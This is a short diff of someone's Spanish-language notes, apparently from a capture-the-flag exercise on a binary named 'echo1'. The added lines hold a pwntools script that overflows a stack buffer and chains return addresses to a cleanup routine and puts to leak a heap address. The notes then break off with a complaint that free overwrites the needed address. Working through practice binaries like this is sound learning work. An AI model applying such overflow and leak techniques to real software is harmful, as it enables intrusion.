@@ -95,4 +95,28 @@ no se donde lo escribi porque es en el stack y no se donde esta...
 si llamo a cleanup, rdi es obj.o,
 dsp llamo a puts y leakeo el address de el heap
 
+
 y no hay leaves !!
+
+from pwn import *
+p = process('./echo1')
+p.recvuntil('name? : ')
+p.sendline('user')
+p.recvuntil('> ')
+p.sendline('1')
+p.recvuntil('user\n')
+payload  = b'A'*32
+payload += b'B'*8 # rbp
+payload += p64(0x004008a0) # inside cleanup
+payload += b'B'*8 # rbp again
+payload += p64(0x00400890) # puts
+payload += b'B'*8 # rbp again
+p.sendline(payload)
+leak = p.recvline()
+leak = u64(leak[-4:] + b'\x00'*4)
+
+free me sobreescribe el address que necesito... LPM!
+
+*************************
+
+
